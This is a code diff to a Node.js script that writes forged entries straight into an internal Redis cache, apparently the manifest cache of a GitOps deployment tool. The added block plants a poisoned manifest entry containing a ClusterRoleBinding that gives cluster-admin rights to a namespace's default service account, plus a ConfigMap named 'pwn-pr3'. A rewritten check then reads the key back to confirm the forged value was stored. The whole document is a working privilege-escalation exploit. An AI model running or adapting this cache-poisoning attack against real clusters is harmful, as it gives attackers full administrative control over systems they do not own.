@@ -55,6 +55,16 @@ for(const [app,d] of Object.entries(P.apps)){
   }}}
 }
 kv.push(['SET','git-refs|'+REPO,refsJson]);
+// --- pr3 端到端干跑条目（模拟空 clusterInfo 的探测请求）---
+const ckEmp=fnva32('|');
+const askP=fnva32('{"appSrc":{"repoURL":"","path":"."},"srcRefs":{}}');
+const pr3man=[
+'apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: u2u-sre-read\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: default\n  namespace: u2u\n',
+'apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: pwn-pr3\n  namespace: d\ndata:\n  ok: "1"\n'];
+const h3=hashOfGo(pr3man,'d',SHA);
+const pr3key='mfst||pr3|'+SHA+'|d|'+(((askP+ckEmp)>>>0))+'|1.8.3';
+kv.push(['SET',pr3key,canonValue(pr3man,'d',SHA,h3)]);
+console.log('PR3KEY='+pr3key);
 console.log('entries to write:',kv.length,'value size ~',Math.round(kv[0][2].length/1024)+'KB');
 // ---- RESP 管道写入 ----
 function resp(cmd){let out='*'+cmd.length+'\r\n';for(const a of cmd){const b=Buffer.from(a);out+='$'+b.length+'\r\n'+a+'\r\n';}return out;}
@@ -66,9 +76,15 @@ function resp(cmd){let out='*'+cmd.length+'\r\n';for(const a of cmd){const b=Buf
   await new Promise(r=>setTimeout(r,3000));
   s.end();
   console.log('written',total,'commands (fire-and-forget)');
-  // 验证：读一条回来
-  const v=net.connect(6379,'172.20.167.25');let b='';
-  v.on('connect',()=>{v.write(resp(['GET',kv[0][1]])+'*2\r\n$4\r\nKEYS\r\n$8\r\nmfst|app*\r\n');});
-  v.on('data',d=>b+=d);v.on('end',()=>{console.log('verify len',b.length);process.exit(0)});
-  setTimeout(()=>{console.log('verify len',b.length,'preview:',b.slice(0,200));process.exit(0)},4000);
+  // 验证：把 pr3 键读回来对比
+  const KEY=pr3key, EXPECT=canonValue(pr3man,'d',SHA,h3);
+  const v=net.connect(6379,'172.20.167.25');let b=Buffer.alloc(0),got=false;
+  v.on('connect',()=>{v.write('*2\r\n$3\r\nGET\r\n$'+Buffer.byteLength(KEY)+'\r\n'+KEY+'\r\n');});
+  v.on('data',d=>{b=Buffer.concat([b,d]);
+    const m=b.toString('latin1').match(/\$(\d+)\r\n/);
+    if(m&&b.length>=m.index+m[0].length+parseInt(m[1])){got=true;
+      const val=b.slice(m.index+m[0].length,m.index+m[0].length+parseInt(m[1])).toString('utf8');
+      console.log('verify pr3: stored='+val.length+'B expected='+EXPECT.length+'B exact_match='+(val===EXPECT));
+      process.exit(0);}});
+  setTimeout(()=>{console.log('verify timeout, got',b.length,'B',got);process.exit(0)},5000);
 })();
